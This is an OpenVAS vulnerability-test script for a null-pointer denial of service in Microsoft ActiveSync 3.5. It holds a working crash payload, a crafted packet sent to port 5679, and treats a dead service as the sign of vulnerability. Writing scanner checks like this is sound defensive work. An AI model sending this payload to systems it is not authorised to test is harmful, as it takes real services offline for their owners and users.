###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_microsoft_activesync_dos_vuln.nasl 11374 2018-09-13 12:45:05Z asteins $
#
# Microsoft ActiveSync Null Pointer Dereference Denial Of Service Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802462");
  script_version("$Revision: 11374 $");
  script_bugtraq_id(7150);
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"$Date: 2018-09-13 14:45:05 +0200 (Thu, 13 Sep 2018) $");
  script_tag(name:"creation_date", value:"2012-09-27 14:28:19 +0530 (Thu, 27 Sep 2012)");
  script_name("Microsoft ActiveSync Null Pointer Dereference Denial Of Service Vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (c) 2012 Greenbone Networks GmbH");
  script_family("Denial of Service");
  script_dependencies("find_service.nasl");
  script_require_ports(5679);

  script_xref(name:"URL", value:"http://secunia.com/advisories/8383/");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/11589");
  script_xref(name:"URL", value:"http://www.securelist.com/en/advisories/8383");
  script_xref(name:"URL", value:"http://www.securityfocus.com/archive/1/315901");

  script_tag(name:"impact", value:"Successful exploitation will allow attackers to cause denial
  of service condition.");
  script_tag(name:"affected", value:"Microsoft ActiveSync version 3.5");
  script_tag(name:"insight", value:"The flaw is due to NULL pointer is dereferenced in a call to the
  function 'WideCharToMultiByte()' while it is trying to process an entry
  within the sync request packet. This causes an application error,
  killing the 'wcescomm' process.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective
  features, remove the product or replace the product by another one.");
  script_tag(name:"summary", value:"This host is running Microsoft ActiveSync and is prone to denial
  of service vulnerability.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

port = 5679;

if(!get_port_state(port)){
  exit(0);
}

req = raw_string(0x06, 0x00, 0x00, 0x00,
      0x24, 0x00, 0x00, 0x00) + crap(124);

soc = open_sock_tcp(port);
if(!soc){
  exit(0);
}

for(i=0; i<3; i++)
{
  sock = open_sock_tcp(port);
  if(sock)
  {
    ## send attack request
    send(socket:soc, data:req);
    close(sock);
  }
  else
  {
    ## If socket is not open service is dead
    close(soc);
    security_message(port);
    exit(0);
  }
}
